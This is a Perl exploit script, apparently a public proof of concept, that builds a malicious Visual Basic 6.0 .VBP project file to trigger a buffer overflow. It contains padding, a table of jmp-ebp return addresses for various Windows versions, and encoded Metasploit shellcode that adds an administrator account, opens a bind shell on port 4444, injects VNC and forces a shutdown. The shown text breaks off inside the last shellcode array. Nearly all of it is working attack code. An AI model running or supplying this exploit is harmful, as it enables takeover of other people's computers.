#!/usr/bin/perl
#' ++ Microsoft Visual Basic 6.0 Code Execution 0-Day ++
#' ++++++++++++++++++++++++++++++++++++++++++++++++++++++
#'++ Author: Koshi                                      +
#'++ Email: heykoshi at gmail dot com                   +
#'++ Application: Microsoft Visual Basic 6.0            +
#'++                                                    +
#'++ Tested on Microsoft Windows XP Home Edition SP2    +
#'++ Patched & Updated                                  +
#'++                                                    +
#'++ The vulnerable buffer exsists in the .VBP files of +
#'++ Visual Basic projects. You can jump directly to    +
#'++ the shellcode, or jump to it via EBP.              +
#'++                                                    +
#'++ There is NO restriction of shellcode size either.  +
#'++                                                    +
#'++ Gr33tz: Rima my baby who I love and adore, Draven  +
#'++ for pointing me in the right direction, as always. +
#'++                                                    +
#'++                                                    +
#'++ This exploit is for educational use only, blah.    +
#'++                                                    +
#'++                                                    +
#'+++++++++++++++++++++++++++++++++++++++++++++++++++++++
#'+++++++++++++++++++++++++++++++++++++++++++++++++++++
#
# Ex. of Usage:
# perl vb6.pl 1 >>Project.vbp
# 
#
$begin0 = "\x54\x79\x70\x65\x3D\x45\x78\x65\x0D\x0A\x46\x6F\x72\x6D".
	  "\x3D\x46\x6F\x72\x6D\x31\x2E\x66\x72\x6D\x0D\x0A";

$begin1 = "\x52\x65\x66\x65\x72\x65\x6E\x63\x65\x3D".
	  "\x2A\x5C\x47\x7B\x30\x30\x30\x32\x30\x34\x33\x30\x2D\x30".
          "\x30\x30\x30\x2D\x30\x30\x30\x30\x2D\x43\x30\x30\x30\x2D".
          "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x34\x36\x7D\x23".
          "\x32\x2E\x30\x23\x30\x23\x2E\x2E\x5C\x2E\x2E\x5C\x2E\x2E".
          "\x5C\x2E\x2E\x5C\x2E\x2E\x5C\x57\x49\x4E\x44\x4F\x57\x53".
          "\x5C\x73\x79\x73\x74\x65\x6D\x33\x32\x5C\x73\x74\x64\x6F".
          "\x6C\x65\x32\x2E\x74\x6C\x62\x23\x4F\x4C\x45\x20\x41\x75".
          "\x74\x6F\x6D\x61\x74\x69\x6F\x6E";

$begin2 = "\x0D\x0A\x53\x74\x61\x72\x74\x75\x70\x3D\x22\x46\x6F\x72\x6D\x31\x22\x0D\x0A".
          "\x43\x6F\x6D\x6D\x61\x6E\x64\x33\x32\x3D\x22\x22";

$BuffOf = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
	  "\x41\x41\x41\x41";

$codeAddr = "\x83\x25\x40\x01";
# You can most likely use a call or a push, you could probably use them from kernel32.dll too.
#* ntdll.dll    - 0x7C923DA3      jmp Ebp **** Is the one i have used in this example.
# 0x77f6d42f  	jmp ebp   	ntdll.dll  (English / 5.2.3790.3) 	Windows 2003 Server 5.2.0.0 SP0 (IA32)
# 0x77f7d9b6 	jmp ebp 	ntdll.dll  (English / 5.1.2600.11061) 	Windows XP 5.1.1.0 SP1 (IA32)
# 0x77f8c449 	jmp ebp 	ntdll.dll  (English / 5.0.2163.1) 	Windows 2000 5.0.0.0 SP0 (IA32)
# 0x77faa6ce 	jmp ebp 	ntdll.dll  (English / 5.2.3790.3) 	Windows 2003 Server 5.2.0.0 SP0 (IA32)
# 0x7c85eb73 	jmp ebp 	ntdll.dll  (English / 5.2.3790.1830031) Windows 2003 Server 5.2.1.0 SP1 (IA32)
# 0x7c8839ed 	jmp ebp 	ntdll.dll  (English / 5.2.3790.1830031) Windows 2003 Server 5.2.1.0 SP1 (IA32)
#*0x7c923da3 	jmp ebp 	ntdll.dll  (English / 5.1.2600.21802) 	Windows XP 5.1.2.0 SP2 (IA32)
# 0x77f8c449 	jmp ebp   	ntdll.dll  (French / 5.0.2163.1) 	Windows 2000 5.0.0.0 SP0 (IA32)
# 0x77f6d9b6  	jmp ebp   	ntdll.dll  (German / 5.1.2600.11061) 	Windows XP 5.1.1.0 SP1 (IA32)
# 0x7c933da3 	jmp ebp  	ntdll.dll  (German / 5.1.2600.21802) 	Windows XP 5.1.2.0 SP2 (IA32)
# 0x77f5d42f  	jmp ebp   	ntdll.dll  (Italian / 5.2.3790.3) 	No associated versions
# 0x77f6d9b6 	jmp ebp 	ntdll.dll  (Italian / 5.1.2600.11061) 	Windows XP 5.1.1.0 SP1 (IA32)
# 0x77f8c449 	jmp ebp 	ntdll.dll  (Italian / 5.0.2163.1) 	Windows 2000 5.0.0.0 SP0 (IA32)
# 0x77f9a6ce 	jmp ebp 	ntdll.dll  (Italian / 5.2.3790.3) 	No associated versions
# 0x7c96eb73 	jmp ebp 	ntdll.dll  (Italian / 5.2.3790.1830031)	No associated versions
# 0x7c9939ed 	jmp ebp 	ntdll.dll  (Italian / 5.2.3790.1830031)	No associated versions
# ...backwards..if you don't know why, then gtfo.
$jmpEbp = "\xA3\x3D\x92\x7C";
$fourSkin = "\x44\x44\x44\x44";


$begin3 = "\x0D\x0A\x4E\x61\x6D\x65\x3D\x22\x50\x72\x6F\x6A\x65\x63".
	  "\x74\x31\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
          "\x41\x41\x41\x41\x41\x41\x41\x41";

$koshi = "\x0D\x0A\x48\x65\x6C\x70\x43\x6F\x6E\x74\x65\x78\x74\x49\x44\x3D\x22\x30\x22\x0D\x0A\x43\x6F\x6D".
	 "\x70\x61\x74\x69\x62\x6C\x65\x4D\x6F\x64\x65\x3D\x22\x30\x22\x0D\x0A\x4D\x61\x6A\x6F\x72\x56\x65".
	 "\x72\x3D\x31\x0D\x0A\x4D\x69\x6E\x6F\x72\x56\x65\x72\x3D\x30\x0D\x0A\x52\x65\x76\x69\x73\x69\x6F".
	 "\x6E\x56\x65\x72\x3D\x30\x0D\x0A\x41\x75\x74\x6F\x49\x6E\x63\x72\x65\x6D\x65\x6E\x74\x56\x65\x72".
	 "\x3D\x30\x0D\x0A\x53\x65\x72\x76\x65\x72\x53\x75\x70\x70\x6F\x72\x74\x46\x69\x6C\x65\x73\x3D\x30".
	 "\x0D\x0A\x43\x6F\x6D\x70\x69\x6C\x61\x74\x69\x6F\x6E\x54\x79\x70\x65\x3D\x30\x0D\x0A\x4F\x70\x74".
	 "\x69\x6D\x69\x7A\x61\x74\x69\x6F\x6E\x54\x79\x70\x65\x3D\x30\x0D\x0A\x46\x61\x76\x6F\x72\x50\x65".
	 "\x6E\x74\x69\x75\x6D\x50\x72\x6F\x28\x74\x6D\x29\x3D\x30\x0D\x0A\x43\x6F\x64\x65\x56\x69\x65\x77".
	 "\x44\x65\x62\x75\x67\x49\x6E\x66\x6F\x3D\x30\x0D\x0A\x4E\x6F\x41\x6C\x69\x61\x73\x69\x6E\x67\x3D".
	 "\x30\x0D\x0A\x42\x6F\x75\x6E\x64\x73\x43\x68\x65\x63\x6B\x3D\x30\x0D\x0A\x4F\x76\x65\x72\x66\x6C".
	 "\x6F\x77\x43\x68\x65\x63\x6B\x3D\x30\x0D\x0A\x46\x6C\x50\x6F\x69\x6E\x74\x43\x68\x65\x63\x6B\x3D".
	 "\x30\x0D\x0A\x46\x44\x49\x56\x43\x68\x65\x63\x6B\x3D\x30\x0D\x0A\x55\x6E\x72\x6F\x75\x6E\x64\x65".
	 "\x64\x46\x50\x3D\x30\x0D\x0A\x53\x74\x61\x72\x74\x4D\x6F\x64\x65\x3D\x30\x0D\x0A\x55\x6E\x61\x74".
	 "\x74\x65\x6E\x64\x65\x64\x3D\x30\x0D\x0A\x52\x65\x74\x61\x69\x6E\x65\x64\x3D\x30\x0D\x0A\x54\x68".
	 "\x72\x65\x61\x64\x50\x65\x72\x4F\x62\x6A\x65\x63\x74\x3D\x30\x0D\x0A\x4D\x61\x78\x4E\x75\x6D\x62".
	 "\x65\x72\x4F\x66\x54\x68\x72\x65\x61\x64\x73\x3D\x31\x0D\x0A\x0D\x0A\x5B\x4D\x53\x20\x54\x72\x61".
	 "\x6E\x73\x61\x63\x74\x69\x6F\x6E\x20\x53\x65\x72\x76\x65\x72\x5D\x0D\x0A\x41\x75\x74\x6F\x52\x65".
	 "\x66\x72\x65\x73\x68\x3D\x31\x0D\x0A";

# win32_exec -  EXITFUNC=seh CMD=calc.exe Size=351 Encoder=PexAlphaNum http://metasploit.com
$shellc1 = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49".
  	   "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36". 
	   "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34".
	   "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41".
	   "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34".
	   "\x42\x50\x42\x30\x42\x50\x4b\x38\x45\x44\x4e\x43\x4b\x38\x4e\x47".
	   "\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x48\x4f\x54\x4a\x41\x4b\x38".
	   "\x4f\x55\x42\x52\x41\x30\x4b\x4e\x49\x54\x4b\x48\x46\x33\x4b\x48".
	   "\x41\x50\x50\x4e\x41\x43\x42\x4c\x49\x59\x4e\x4a\x46\x48\x42\x4c".
	   "\x46\x47\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e".
	   "\x46\x4f\x4b\x43\x46\x35\x46\x52\x46\x30\x45\x37\x45\x4e\x4b\x58".
	   "\x4f\x45\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x48\x4e\x30\x4b\x44".
	   "\x4b\x48\x4f\x35\x4e\x41\x41\x30\x4b\x4e\x4b\x38\x4e\x51\x4b\x38".
	   "\x41\x50\x4b\x4e\x49\x38\x4e\x45\x46\x32\x46\x50\x43\x4c\x41\x33".
	   "\x42\x4c\x46\x46\x4b\x48\x42\x34\x42\x33\x45\x38\x42\x4c\x4a\x47".
  	   "\x4e\x30\x4b\x38\x42\x34\x4e\x50\x4b\x58\x42\x47\x4e\x41\x4d\x4a".
	   "\x4b\x58\x4a\x36\x4a\x30\x4b\x4e\x49\x50\x4b\x48\x42\x48\x42\x4b".
	   "\x42\x30\x42\x50\x42\x30\x4b\x38\x4a\x56\x4e\x43\x4f\x55\x41\x33".
	   "\x48\x4f\x42\x46\x48\x35\x49\x38\x4a\x4f\x43\x58\x42\x4c\x4b\x37".
	   "\x42\x55\x4a\x36\x42\x4f\x4c\x58\x46\x50\x4f\x35\x4a\x36\x4a\x59".
	   "\x50\x4f\x4c\x38\x50\x50\x47\x55\x4f\x4f\x47\x4e\x43\x56\x41\x56".
	   "\x4e\x46\x43\x56\x50\x32\x45\x46\x4a\x37\x45\x36\x42\x50\x5a";

# win32_adduser -  PASS=koshi EXITFUNC=seh USER=4dmin Size=495 Encoder=PexAlphaNum http://metasploit.com
$shellc2 = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49".
	   "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36".
	   "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34".
	   "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41".
	   "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44".
	   "\x42\x30\x42\x50\x42\x30\x4b\x48\x45\x44\x4e\x53\x4b\x38\x4e\x37".
	   "\x45\x50\x4a\x47\x41\x50\x4f\x4e\x4b\x38\x4f\x54\x4a\x51\x4b\x58".
	   "\x4f\x35\x42\x52\x41\x30\x4b\x4e\x49\x54\x4b\x38\x46\x53\x4b\x48".
	   "\x41\x30\x50\x4e\x41\x53\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c".
	   "\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e".
	   "\x46\x4f\x4b\x53\x46\x55\x46\x52\x46\x30\x45\x47\x45\x4e\x4b\x48".
	   "\x4f\x45\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x48\x4e\x50\x4b\x54".
	   "\x4b\x48\x4f\x55\x4e\x51\x41\x50\x4b\x4e\x4b\x58\x4e\x51\x4b\x58".
 	   "\x41\x30\x4b\x4e\x49\x38\x4e\x55\x46\x42\x46\x30\x43\x4c\x41\x33".
	   "\x42\x4c\x46\x46\x4b\x58\x42\x34\x42\x53\x45\x48\x42\x4c\x4a\x37".
	   "\x4e\x30\x4b\x48\x42\x44\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a".
	   "\x4b\x58\x4a\x36\x4a\x30\x4b\x4e\x49\x50\x4b\x48\x42\x48\x42\x4b".
	   "\x42\x30\x42\x30\x42\x50\x4b\x58\x4a\x36\x4e\x53\x4f\x45\x41\x53".
	   "\x48\x4f\x42\x36\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x57".
	   "\x42\x55\x4a\x56\x42\x4f\x4c\x58\x46\x50\x4f\x55\x4a\x46\x4a\x59".
	   "\x50\x4f\x4c\x58\x50\x30\x47\x35\x4f\x4f\x47\x4e\x43\x36\x4d\x46".
	   "\x46\x56\x50\x42\x45\x36\x4a\x37\x45\x56\x42\x32\x4f\x52\x43\x46".
	   "\x42\x42\x50\x56\x45\x46\x46\x47\x42\x52\x45\x47\x43\x37\x45\x36".
	   "\x44\x57\x42\x42\x46\x53\x46\x36\x4d\x56\x49\x46\x50\x56\x42\x32".
	   "\x4b\x36\x4f\x36\x43\x37\x4a\x46\x49\x36\x42\x32\x4f\x42\x41\x34".
	   "\x46\x54\x46\x34\x42\x32\x48\x52\x48\x52\x42\x52\x50\x36\x45\x46".
	   "\x46\x57\x42\x42\x4e\x56\x4f\x36\x43\x36\x41\x36\x4e\x46\x47\x56".
	   "\x44\x37\x4f\x36\x45\x57\x42\x57\x42\x52\x41\x44\x46\x56\x4d\x56".
	   "\x49\x46\x50\x56\x49\x46\x43\x47\x46\x57\x44\x37\x41\x36\x46\x57".
	   "\x4f\x46\x44\x37\x43\x37\x42\x32\x46\x43\x46\x36\x4d\x56\x49\x36".
	   "\x50\x56\x42\x42\x4f\x32\x41\x44\x46\x54\x46\x54\x42\x50\x5a";

# win32_bind -  EXITFUNC=seh LPORT=4444 Size=709 Encoder=PexAlphaNum http://metasploit.com
$shellc3 = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49".
	   "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36".
	   "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34".
	   "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41".
	   "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e".
	   "\x4d\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x56\x4b\x38".
	   "\x4e\x36\x46\x52\x46\x32\x4b\x38\x45\x54\x4e\x53\x4b\x48\x4e\x37".
	   "\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x58\x4f\x44\x4a\x41\x4b\x58".
	   "\x4f\x45\x42\x52\x41\x50\x4b\x4e\x49\x44\x4b\x58\x46\x33\x4b\x48".
	   "\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a\x46\x58\x42\x4c".
	   "\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x50\x44\x4c\x4b\x4e".
	   "\x46\x4f\x4b\x33\x46\x35\x46\x32\x4a\x32\x45\x57\x45\x4e\x4b\x48".
	   "\x4f\x35\x46\x32\x41\x30\x4b\x4e\x48\x36\x4b\x58\x4e\x30\x4b\x54".
	   "\x4b\x58\x4f\x35\x4e\x31\x41\x50\x4b\x4e\x43\x50\x4e\x52\x4b\x58".
	   "\x49\x58\x4e\x46\x46\x52\x4e\x31\x41\x46\x43\x4c\x41\x33\x4b\x4d".
	   "\x46\x46\x4b\x48\x43\x34\x42\x53\x4b\x58\x42\x54\x4e\x30\x4b\x48".
	   "\x42\x57\x4e\x31\x4d\x4a\x4b\x48\x42\x44\x4a\x50\x50\x45\x4a\x46".
	   "\x50\x38\x50\x34\x50\x50\x4e\x4e\x42\x55\x4f\x4f\x48\x4d\x48\x46".
	   "\x43\x45\x48\x56\x4a\x36\x43\x53\x44\x33\x4a\x46\x47\x57\x43\x37".
	   "\x44\x53\x4f\x55\x46\x35\x4f\x4f\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e".
	   "\x4e\x4f\x4b\x53\x42\x55\x4f\x4f\x48\x4d\x4f\x45\x49\x38\x45\x4e".
	   "\x48\x36\x41\x58\x4d\x4e\x4a\x50\x44\x30\x45\x45\x4c\x36\x44\x50".
	   "\x4f\x4f\x42\x4d\x4a\x56\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x45".
	   "\x4f\x4f\x48\x4d\x43\x45\x43\x45\x43\x55\x43\x55\x43\x55\x43\x54".
	   "\x43\x45\x43\x54\x43\x45\x4f\x4f\x42\x4d\x48\x46\x4a\x36\x41\x31".
	   "\x4e\x35\x48\x46\x43\x55\x49\x58\x41\x4e\x45\x59\x4a\x46\x46\x4a".
	   "\x4c\x41\x42\x47\x47\x4c\x47\x35\x4f\x4f\x48\x4d\x4c\x46\x42\x31".
	   "\x41\x55\x45\x55\x4f\x4f\x42\x4d\x4a\x46\x46\x4a\x4d\x4a\x50\x32".
	   "\x49\x4e\x47\x55\x4f\x4f\x48\x4d\x43\x55\x45\x55\x4f\x4f\x42\x4d".
	   "\x4a\x56\x45\x4e\x49\x44\x48\x38\x49\x34\x47\x55\x4f\x4f\x48\x4d".
	   "\x42\x45\x46\x45\x46\x45\x45\x35\x4f\x4f\x42\x4d\x43\x59\x4a\x36".
	   "\x47\x4e\x49\x47\x48\x4c\x49\x37\x47\x35\x4f\x4f\x48\x4d\x45\x45".
	   "\x4f\x4f\x42\x4d\x48\x56\x4c\x36\x46\x56\x48\x46\x4a\x36\x43\x46".
	   "\x4d\x36\x49\x38\x45\x4e\x4c\x46\x42\x35\x49\x45\x49\x32\x4e\x4c".
	   "\x49\x48\x47\x4e\x4c\x56\x46\x54\x49\x48\x44\x4e\x41\x43\x42\x4c".
	   "\x43\x4f\x4c\x4a\x50\x4f\x44\x54\x4d\x52\x50\x4f\x44\x54\x4e\x42".
	   "\x43\x59\x4d\x38\x4c\x47\x4a\x43\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36".
	   "\x44\x47\x50\x4f\x43\x4b\x48\x41\x4f\x4f\x45\x47\x46\x54\x4f\x4f".
	   "\x48\x4d\x4b\x45\x47\x45\x44\x35\x41\x35\x41\x45\x41\x55\x4c\x46".
	   "\x41\x30\x41\x45\x41\x45\x45\x45\x41\x45\x4f\x4f\x42\x4d\x4a\x36".
	   "\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x45\x4f\x4f\x48\x4d\x4c\x56".
	   "\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f\x42\x4d\x4b\x48\x47\x35\x4e\x4f".
	   "\x43\x38\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x55\x4f\x4f\x42\x4d".
	   "\x4a\x56\x42\x4f\x4c\x58\x46\x50\x4f\x55\x43\x45\x4f\x4f\x48\x4d".
	   "\x4f\x4f\x42\x4d\x5a";

# win32_bind_vncinject -  VNCDLL=/home/opcode/msfweb/framework/data/vncdll.dll EXITFUNC=seh AUTOVNC=1 VNCPORT=5900 LPORT=4444 Size=649 Encoder=PexAlphaNum http://metasploit.com
$shellc4 = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49".
	   "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36".
	   "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34".
	   "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41".
	   "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4a\x4e\x48\x55\x42\x50".
	   "\x42\x30\x42\x30\x43\x55\x45\x35\x48\x45\x47\x45\x4b\x38\x4e\x36".
	   "\x46\x42\x4a\x31\x4b\x38\x45\x54\x4e\x33\x4b\x48\x46\x55\x45\x30".
	   "\x4a\x47\x41\x50\x4c\x4e\x4b\x58\x4c\x54\x4a\x31\x4b\x48\x4c\x55".
	   "\x42\x42\x41\x50\x4b\x4e\x43\x4e\x44\x43\x49\x54\x4b\x58\x46\x33".
	   "\x4b\x48\x41\x30\x50\x4e\x41\x33\x4f\x4f\x4e\x4f\x41\x43\x42\x4c".
	   "\x4e\x4a\x4a\x53\x42\x4e\x46\x57\x47\x30\x41\x4c\x4f\x4c\x4d\x30".
	   "\x41\x30\x47\x4c\x4b\x4e\x44\x4f\x4b\x33\x4e\x47\x46\x42\x46\x51".
	   "\x45\x37\x41\x4e\x4b\x38\x4c\x35\x46\x52\x41\x30\x4b\x4e\x48\x56".
	   "\x4b\x58\x4e\x50\x4b\x54\x4b\x48\x4c\x55\x4e\x51\x41\x30\x4b\x4e".
	   "\x4b\x58\x46\x30\x4b\x58\x41\x50\x4a\x4e\x4b\x4e\x44\x50\x41\x43".
	   "\x42\x4c\x4f\x35\x50\x35\x4d\x35\x4b\x45\x44\x4c\x4a\x50\x42\x50".
	   "\x50\x55\x4c\x36\x42\x33\x49\x55\x46\x46\x4b\x58\x49\x31\x4b\x38".
	   "\x4b\x45\x4e\x50\x4b\x38\x4b\x35\x4e\x31\x4b\x48\x4b\x51\x4b\x58".
	   "\x4b\x45\x4a\x30\x43\x55\x4a\x56\x50\x38\x50\x34\x50\x50\x4e\x4e".
	   "\x4f\x4f\x48\x4d\x49\x48\x47\x4c\x41\x58\x4e\x4e\x42\x50\x41\x50".
	   "\x42\x50\x42\x30\x47\x45\x48\x55\x43\x45\x49\x38\x45\x4e\x4a\x4e".
	   "\x47\x52\x42\x30\x42\x30\x42\x30\x42\x59\x41\x50\x42\x30\x42\x50".
	   "\x48\x4b\x49\x51\x4a\x51\x47\x4e\x46\x4a\x49\x31\x42\x47\x49\x4e".
	   "\x45\x4e\x49\x54\x48\x58\x49\x54\x46\x4a\x4c\x51\x42\x37\x47\x4c".
	   "\x46\x4a\x4d\x4a\x50\x42\x49\x4e\x49\x4d\x49\x50\x45\x4f\x4d\x4a".
	   "\x4b\x4c\x4d\x4e\x4e\x4f\x4b\x43\x47\x45\x43\x35\x44\x33\x4f\x45".
	   "\x43\x33\x44\x43\x42\x30\x4b\x45\x4d\x38\x4b\x34\x42\x42\x41\x55".
	   "\x4f\x4f\x47\x4d\x49\x58\x4f\x4d\x49\x38\x43\x4c\x4d\x58\x45\x47".
	   "\x46\x41\x4c\x36\x47\x30\x49\x45\x41\x35\x43\x45\x4f\x4f\x46\x43".
	   "\x4f\x38\x4f\x4f\x45\x35\x46\x50\x49\x35\x49\x58\x46\x50\x50\x48".
	   "\x44\x4e\x44\x4f\x4b\x32\x47\x52\x46\x35\x4f\x4f\x47\x43\x4f\x4f".
	   "\x45\x35\x42\x43\x41\x53\x42\x4c\x42\x45\x42\x35\x42\x35\x42\x55".
	   "\x42\x54\x42\x55\x42\x44\x42\x35\x4f\x4f\x45\x45\x4e\x32\x49\x48".
	   "\x47\x4c\x41\x53\x4b\x4d\x43\x45\x43\x45\x4a\x46\x44\x30\x42\x50".
	   "\x41\x31\x4e\x55\x49\x48\x42\x4e\x4c\x36\x42\x31\x42\x35\x47\x55".
	   "\x4f\x4f\x45\x35\x46\x32\x43\x55\x47\x45\x4f\x4f\x45\x45\x4a\x32".
	   "\x43\x55\x46\x35\x47\x45\x4f\x4f\x45\x55\x42\x32\x49\x48\x47\x4c".
	   "\x41\x58\x4e\x4e\x42\x50\x42\x31\x42\x50\x42\x50\x49\x58\x43\x4e".
	   "\x4c\x46\x42\x50\x4a\x46\x42\x30\x42\x51\x42\x30\x42\x30\x43\x35".
	   "\x47\x45\x4f\x4f\x45\x35\x4a\x31\x41\x58\x4e\x4e\x42\x30\x46\x30".
	   "\x42\x30\x42\x30\x4f\x4f\x43\x4d\x5a";

# win32_exec -  EXITFUNC=seh CMD=shutdown -c "HAI VEn0m pwn3d j00r b0x0r wif k0sh1 u b1tch" Size=451 Encoder=PexAlphaNum http://metasploit.com
$shellc5 = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49".
	   "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36".
	   "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34".
	   "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41".
	   "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34".
	   "\x42\x50\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x43\x4b\x38\x4e\x47".
	   "\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x54\x4a\x51\x4b\x48".
	   "\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x54\x4b\x38\x46\x43\x4b\x48".
	   "\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x59\x4e\x4a\x46\x58\x42\x4c".
	   "\x46\x47\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e".
	   "\x46\x4f\x4b\x53\x46\x55\x46\x32\x46\x30\x45\x37\x45\x4e\x4b\x38".
	   "\x4f\x55\x46\x52\x41\x50\x4b\x4e\x48\x56\x4b\x48\x4e\x50\x4b\x34".
	   "\x4b\x38\x4f\x45\x4e\x31\x41\x30\x4b\x4e\x4b\x38\x4e\x31\x4b\x48".
	   "\x41\x50\x4b\x4e\x49\x48\x4e\x35\x46\x32\x46\x50\x43\x4c\x41\x43".
	   "\x42\x4c\x46\x56\x4b\x48\x42\x34\x42\x43\x45\x58\x42\x4c\x4a\x37".
	   "\x4e\x50\x4b\x38\x42\x34\x4e\x50\x4b\x38\x42\x57\x4e\x51\x4d\x4a".
	   "\x4b\x58\x4a\x36\x4a\x50\x4b\x4e\x49\x30\x4b\x58\x42\x58\x42\x4b".
